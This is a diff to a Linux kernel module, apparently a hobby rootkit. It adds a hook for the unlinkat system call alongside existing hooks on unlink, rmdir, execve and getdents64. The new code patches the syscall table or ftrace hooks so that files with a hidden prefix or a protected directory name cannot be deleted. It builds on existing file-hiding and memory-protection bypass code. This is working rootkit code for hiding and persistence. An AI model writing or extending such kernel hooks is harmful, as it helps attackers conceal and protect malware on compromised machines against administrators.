@@ -112,6 +112,7 @@ static syscall_wrapper orig_sys_getdents64;
 static syscall_wrapper orig_unlink;
 static syscall_wrapper orig_execve;
 static syscall_wrapper orig_rmdir;
+static syscall_wrapper orig_unlinkat;
 
 
 static inline void write_forced_cr0(unsigned long value)
@@ -349,12 +350,36 @@ asmlinkage long h_unlink(struct pt_regs *regs)
     printk(KERN_ALERT "Permission denied for arman: %s\n", buf);
 
     // Check if the file starts with "arman"
-    if (strstr(buf, HIDE_PREFIX) != NULL) {
+    if (strstr(buf, HIDE_PREFIX) != NULL || strstr(buf, RM_DIR) != NULL) {
         printk(KERN_ALERT "Permission denied for arman: %s\n", buf);
         return -EPERM;
     }
 
     return orig_unlink(regs);
+}
+
+
+asmlinkage long h_unlinkat(struct pt_regs *regs)
+{
+    const char __user *pathname = regs->di;
+    char buf[HIDE_PREFIX_SZ + 1];
+
+    // Copy the user-space pathname to kernel space
+    if (strncpy_from_user(buf, pathname, HIDE_PREFIX_SZ) < 0)
+        return -EFAULT;
+
+    // Null-terminate the copied string
+    buf[HIDE_PREFIX_SZ] = '\0';
+
+    printk(KERN_ALERT "Permission denied for arman: %s\n", buf);
+
+    // Check if the file starts with "arman"
+    if (strstr(buf, RM_DIR) != NULL) {
+        printk(KERN_ALERT "Permission denied for arman: %s\n", buf);
+        return -EPERM;
+    }
+
+    return orig_unlinkat(regs);
 }
 
 static asmlinkage long h_sys_getdents64(struct pt_regs *regs)
@@ -527,6 +552,24 @@ static void restore_unlink(void)
     __sys_call_table_addr[__NR_unlink] = (unsigned long)orig_unlink;
 }
 
+static void store_unlinkat(void)
+{
+    orig_unlinkat = (syscall_wrapper)__sys_call_table_addr[__NR_unlinkat];
+}
+
+
+static void hook_unlinkat(void)
+{
+    __sys_call_table_addr[__NR_unlinkat] = (unsigned long)&h_unlinkat;
+}
+
+
+static void restore_unlinkat(void)
+{
+    /* Restore syscall table */
+    __sys_call_table_addr[__NR_unlinkat] = (unsigned long)orig_unlinkat;
+}
+
 static void store_execve(void)
 {
     orig_execve = (syscall_wrapper)__sys_call_table_addr[__NR_execve];
@@ -627,6 +670,7 @@ static struct ftrace_hook ftrace_hooks[] = {
         HOOK("sys_unlink", h_unlink, &orig_unlink),
         HOOK("sys_execve", h_sys_execve, &orig_execve),
         HOOK("sys_rmdir", h_sys_rmdir, &orig_rmdir),
+        HOOK("sys_unlinkat", h_unlinkat, &orig_unlinkat),
 };
 #endif
 
@@ -669,6 +713,7 @@ static int __init mod_init(void)
     store_unlink();
     store_execve();
     store_rmdir();
+    store_unlinkat();
 
     unprotect_memory();
     
@@ -678,6 +723,7 @@ static int __init mod_init(void)
     hook_unlink();
     hook_execve();
     hook_rmdir();
+    hook_unlinkat();
 
     protect_memory();
 #endif
@@ -702,6 +748,7 @@ static void __exit mod_exit(void)
     restore_unlink();
     restore_execve();
     restore_rmdir();
+    restore_unlinkat();
 
     protect_memory();
 #endif
